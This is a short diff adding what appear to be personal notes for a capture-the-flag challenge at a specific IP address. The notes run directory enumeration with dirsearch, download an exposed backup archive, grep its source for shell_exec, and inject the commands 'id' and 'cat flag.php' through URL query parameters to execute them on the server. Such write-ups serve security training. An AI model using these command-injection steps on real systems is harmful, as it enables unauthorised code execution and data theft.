@@ -1,0 +1,9 @@
+dirsearch -u http://35.198.135.192:31458/
+
+go on http://35.198.135.192:31458/backup.zip
+download file in kali
+cd backup
+use command  -... grep -r "shell_exec("
+modify url http://35.198.135.192:31458/?welldone=knockknock&shazam=id
+change http://35.198.135.192:31458/?welldone=knockknock&shazam=cat flag.php
+107 row in source code
